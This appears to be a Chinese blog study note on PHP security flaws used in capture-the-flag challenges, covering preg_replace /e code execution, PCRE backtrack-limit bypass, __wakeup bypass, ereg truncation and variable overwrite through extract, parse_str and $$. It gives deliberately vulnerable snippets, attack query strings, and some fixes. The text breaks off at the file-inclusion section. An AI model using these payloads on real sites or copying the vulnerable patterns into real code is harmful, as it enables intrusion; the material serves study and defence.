class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($a) === <span class="number">666</span>) &#123;</span><br><span class="line">$sql = <span class="string">"Select a From Table Where Id="</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"No..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/26/PHP_01/20200814205019.png" alt="image-20200814205011129"></p><h2 id="2-srand-mt-srand"><a href="#2-srand-mt-srand" class="headerlink" title="2 srand()/mt_srand()"></a>2 srand()/mt_srand()</h2><p>语法：<code>srand(seed)</code> 和 <code>mt_srand(seed)</code></p><p>自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。但他却有个特性就是 当设置好种子后 再通过mt_rand()生成出来的随机数将会是固定的。</p><p><a href="https://mp.weixin.qq.com/s/nVqkiMXyg2D_HtwLTkSgMA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nVqkiMXyg2D_HtwLTkSgMA</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomString</span><span class="params">($len, $chars=null)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (is_null($chars))&#123; $chars = <span class="string">"bcdefghijklmnpqrtuvwxyzBCDEFGHIJKLMNPQRTUVWXYZ12345679"</span>; &#125;</span><br><span class="line">mt_srand(<span class="number">10000000</span>*(double)microtime());</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>, $str = <span class="string">''</span>, $lc = strlen($chars)<span class="number">-1</span>; $i &lt; $len; $i++)&#123;</span><br><span class="line">$str .= $chars[mt_rand(<span class="number">0</span>, $lc)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(double)microtime() 只有6位有效数字，种子取值0,10,20,30,40,50,60,70,80,90,100~9999980,9999990 共100W，种子固定，生成的随机数固定即生成的随机字符串固定，导致可爆破</p><h2 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3 preg_replace()"></a>3 preg_replace()</h2><p><strong>定义：</strong><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code></p><p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换</p><p><strong>参数：</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$pattern</span>: 要搜索的模式，可以是字符串或一个字符串数组。</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$replacement</span>: 用于替换的字符串或字符串数组。</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$subject</span>: 要搜索替换的目标字符串或字符串数组。</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$limit</span>: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$count</span>: 可选，为替换执行的次数。</span></span><br></pre></td></tr></table></figure><p><strong>常用PCRE修饰符：</strong></p><ul><li><em>i</em> (<em>PCRE_CASELESS</em>)：如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配</li><li><em>m</em> (<em>PCRE_MULTILINE</em>)： “行首”元字符 (^) 和”行末”元字符 ($) 会匹配目标字符串中任意换行符之前或之后</li><li><em>s</em> (<em>PCRE_DOTALL</em>)：点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。一个取反字符类比如 <code>[^a]</code> 总是匹配换行符，而不依赖于这个修饰符的设置。</li></ul><p><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php</a></p><p>1）/e 修饰符问题</p><p>在PHP5.5.0起废弃，php7.0.0 起不再支持</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">'/test/e'</span>,$_GET[<span class="string">'r'</span>],<span class="string">'atest'</span>);</span><br></pre></td></tr></table></figure><p><code>?r=phpinfo()</code>，获取 phpinfo</p><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span><span class="params">($regex, $value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_replace(</span><br><span class="line">    <span class="string">'/('</span> . $regex . <span class="string">')/ei'</span>,</span><br><span class="line">    <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">    $value</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $regex =&gt; $value) &#123;</span><br><span class="line">  <span class="keyword">echo</span> complexStrtolower($regex, $value) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?\S*={${phpinfo()}}</code> ，正则表达式 <code>\1</code> 表示符合匹配的第一个子串，<code>{${phpinfo()}}</code> 使用了可变变量的知识。</p><p>2）经典写配置漏洞</p><p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa\\'</span>);</span><br></pre></td></tr></table></figure><h2 id="4-preg-match"><a href="#4-preg-match" class="headerlink" title="4 preg_match()"></a>4 preg_match()</h2><p>1）缺少开始和结束符</p><p>在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">'1.1.1.1 abcd'</span>; <span class="comment">// 可以绕过</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>,$ip)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span>(<span class="string">'key...'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2）PCRE 回溯次数限制绕过</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_php($input)) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可填入垃圾数据导致回溯次数超过了100万 <code>preg_match</code> 返回 FALSE 绕过判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bool(false)</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, <span class="string">'&lt;?php phpinfo();//'</span>.str_repeat(<span class="string">'c'</span>, <span class="number">1000000</span>)));</span><br></pre></td></tr></table></figure><p>修复方法，改用 <code>===</code> 判断返回值，不要只使用 if 判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_php($input) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-序列化"><a href="#5-序列化" class="headerlink" title="5 序列化"></a>5 序列化</h2><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><h3 id="5-1-wakeup-绕过"><a href="#5-1-wakeup-绕过" class="headerlink" title="5.1 __wakeup() 绕过"></a>5.1 __wakeup() 绕过</h3><p><a href="https://www.mi1k7ea.com/2019/06/21/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%B0%8F%E7%BB%93/#0x04" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/21/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%B0%8F%E7%BB%93/#0x04</a></p><blockquote><p>wakeup()作为反序列化中的一个魔法函数，自<code>unserialize()</code>从字节流中创建了一个对象后，程序会马上检测是否具有wakeup()函数存在。若存在，__wakeup()函数会立即被调用。</p><p>使用__wakeup()函数的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</p><p>在如下情形中，在序列化字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2会产生报错，导致不会去执行__wakeup()函数，从而Bypass</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mi1k7ea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $text = <span class="string">"h12r0h1f0jfj"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"[!]Bad Request."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo serialize(new Mi1k7ea());</span></span><br><span class="line"><span class="comment">// O:7:"Mi1k7ea":1:&#123;s:4:"text";s:12:"h12r0h1f0jfj";&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> unserialize($_GET[<span class="string">'flag'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bypass __wakeup()!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-2-特殊的序列化类型S-大写"><a href="#5-2-特殊的序列化类型S-大写" class="headerlink" title="5.2 特殊的序列化类型S(大写)"></a>5.2 特殊的序列化类型S(大写)</h3><p>PHP6 新增序列化格式 S，escaped binary string，会将 \xx(16进制) 当做字符处理，所以这里可以造成 check 的绕过，可以参照 2020 强网杯web辅助一题</p><p><a href="https://z3ratu1.github.io/2020/08/24/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5Dweb/" target="_blank" rel="noopener">https://z3ratu1.github.io/2020/08/24/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5Dweb/</a></p><h2 id="6-ereg"><a href="#6-ereg" class="headerlink" title="6 ereg()"></a>6 ereg()</h2><p>功能同 preg_match() 类似，只不过仅在 php4，php5 中可使用，可使用 <code>%00</code> 截断正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?password=123%00&amp;&amp;** </span></span><br><span class="line"><span class="comment">//int 1</span></span><br><span class="line">var_dump(ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]));</span><br></pre></td></tr></table></figure><h2 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="7 is_numeric()"></a>7 is_numeric()</h2><p>is_numeric()函数来判断变量是否为数字，是数字返回1，不是则返回0。比较范围不局限于十进制数字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"flag&#123;test&#125;"</span>;</span><br><span class="line"></span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;    </span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?password=1337a</code></p><h2 id="8-变量覆盖"><a href="#8-变量覆盖" class="headerlink" title="8 变量覆盖"></a>8 变量覆盖</h2><p><code>https://www.mi1k7ea.com/2019/06/20/PHP变量覆盖漏洞/</code></p><p>变量覆盖即通过外部输入将某个变量的值给覆盖掉，通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。</p><h3 id="8-1-register-globals"><a href="#8-1-register-globals" class="headerlink" title="8.1 register_globals"></a>8.1 register_globals</h3><p>php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。</p><p><strong>注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</strong></p><p>当register_globals=On，变量未被初始化且能够用户所控制时，就会存在变量覆盖漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Register_globals: "</span> . (int)ini_get(<span class="string">"register_globals"</span>) . <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?a=1</code>，可以通过 get 、post 也可以通过 cookie 等方式传递</p><h3 id="8-2-extract"><a href="#8-2-extract" class="headerlink" title="8.2 extract()"></a>8.2 extract()</h3><p>extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。必须使用关联数组，数字索引的数组将不会产生结果，除非用了 <strong><code>EXTR_PREFIX_ALL</code></strong> 或者 <strong><code>EXTR_PREFIX_INVALID</code></strong>。</p><p><strong>函数定义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract ( <span class="keyword">array</span> &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = <span class="keyword">NULL</span> ]] ) : int</span><br></pre></td></tr></table></figure><ul><li>$flags：默认为 <code>EXTR_OVERWRITE</code>，如果有冲突，覆盖已有的变量。<code>EXTR_SKIP</code> 如果有冲突，不覆盖已有的变量。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"0"</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>防御方法：在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖，<code>extract($_GET,EXTR_SKIP);</code></p><h3 id="8-3-parse-str"><a href="#8-3-parse-str" class="headerlink" title="8.3 parse_str()"></a>8.3 parse_str()</h3><p>parse_str()函数通常用于解析URL中的querystring，把查询字符串解析到变量中。</p><p><strong>函数定义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str ( string $encoded_string [, <span class="keyword">array</span> &amp;$result ] ) : void</span><br></pre></td></tr></table></figure><ul><li>$result：设置了这个参数，变量将会以数组元素的形式存入到这个数组，作为替代。如果没有设置，则由该函数设置的变量将覆盖已存在的同名变量。</li></ul><p><strong>注意：在 PHP 7.2 中将<em>废弃</em>不设置参数的行为</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=mi1k7ea</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'oop'</span>;</span><br><span class="line">parse_str($_SERVER[<span class="string">"QUERY_STRING"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">'mi1k7ea'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-4-mb-parse-str"><a href="#8-4-mb-parse-str" class="headerlink" title="8.4 mb_parse_str()"></a>8.4 mb_parse_str()</h3><p>mb_parse_str()函数用于解析GET/POST/COOKIE数据并设置全局变量，和parse_str()类似：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'oop'</span>;</span><br><span class="line">mb_parse_str($_SERVER[<span class="string">"QUERY_STRING"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">'mi1k7ea'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-5-import-request-variables"><a href="#8-5-import-request-variables" class="headerlink" title="8.5 import_request_variables()"></a>8.5 import_request_variables()</h3><p>(PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0)</p><p>import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</p><p><strong>函数定义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import_request_variables ( string $types [, string $prefix ] ) : bool</span><br></pre></td></tr></table></figure><ul><li>types：可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=1</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"0"</span>;</span><br><span class="line">import_request_variables(<span class="string">"G"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Fucked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Nothing!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-6-导致的变量覆盖"><a href="#8-6-导致的变量覆盖" class="headerlink" title="8.6 $$导致的变量覆盖"></a>8.6 $$导致的变量覆盖</h3><p>$$这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$$a = <span class="string">'world'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;    <span class="comment">//hello world</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $hello"</span>;   <span class="comment">//hello world</span></span><br></pre></td></tr></table></figure><p>即 <code>${$a}</code> 就代表 <code>$hello</code></p><p>变量覆盖常在 foreach 语句中出现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$&#123;$key&#125; = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"BugsBunnyCTF is here :p…"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )&#123;</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">$$key = $$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )&#123;</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?_200-=flag</code> ，post 数据 <code>flag=1</code> ，这里注意两个 foreach 语句的不同，第一个为 <code>$$value</code>，第二个为 <code>$value</code> 。<code>?_200-=flag</code> 先将 flag 变量的值覆盖到 _200 变量，然后<code>flag=1</code> 将 flag 变量值覆盖掉，使 post 的 flag 和 flag 变量的值相等。</p><h3 id="8-7-变量覆盖防御"><a href="#8-7-变量覆盖防御" class="headerlink" title="8.7 变量覆盖防御"></a>8.7 变量覆盖防御</h3><ol><li>尽量使用原始变量数组</li><li>注册变量前判断变量是否存在，比如 <code>extract()</code> 的 <code>EXTR_SKIP</code> 模式</li></ol><h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9 文件包含"></a>9 文件包含</h2><p>在 php.ini 中，allow_url_fopen 默认一直是On，而 allow_url_include 从 php5.2 之后就默认为 Off</p><p><a 